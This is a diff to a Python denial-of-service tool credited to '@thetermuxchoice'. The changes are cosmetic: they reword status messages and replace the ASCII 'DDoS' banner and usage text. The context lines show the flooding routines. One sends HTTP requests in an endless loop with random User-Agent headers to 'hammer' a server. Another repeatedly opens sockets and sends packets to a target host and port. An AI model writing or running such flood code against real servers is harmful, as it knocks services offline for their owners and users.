@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mAttacking Server\033[0m")
+			print("\033[94m Attacking Server...!\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,13 +49,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mPackets Sent!\033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m» Packets Sent!\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91m no connection! server maybe down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,22 +75,21 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m
-	 ____  ____       ____
-	|  _ \|  _ \  ___/ ___|
-	| | | | | | |/ _ \___ \
-	| |_| | |_| | (_) |__) |
-	|____/|____/ \___/____/
-	Coded by: @thetermuxchoice
-	GitHub : https://github.com/thetermuxchoice
-	Usage  : python3 attack.py [-s] [-p] [-t]
+	print (''' \033[92m	
+	╦  ┬ ┬┌─┐┬┌┬┐┌─┐  ╔╦╗╔╦╗┌─┐╔═╗
+	║  │ ││  │ │ ├─┤   ║║ ║║│ │╚═╗
+	╩═╝└─┘└─┘┴ ┴ ┴ ┴  ═╩╝═╩╝└─┘╚═╝v1.0
+	Coded by @thetermuxchoice
+	Anonymous External Tools
+	Github: https://github.com/thetermuxchoice \n
+	Usage : python3 pukul.py [-s] [-p] [-t]	
 	-h : Help
-	-s : Server IP
-	-p : Port number
+	-s : IP Address
+	-p : Port Number
 	-t : Turbo default 135 \033[0m''')
 	sys.exit()
 
-
+	
 def get_parameters():
 	global host
 	global port
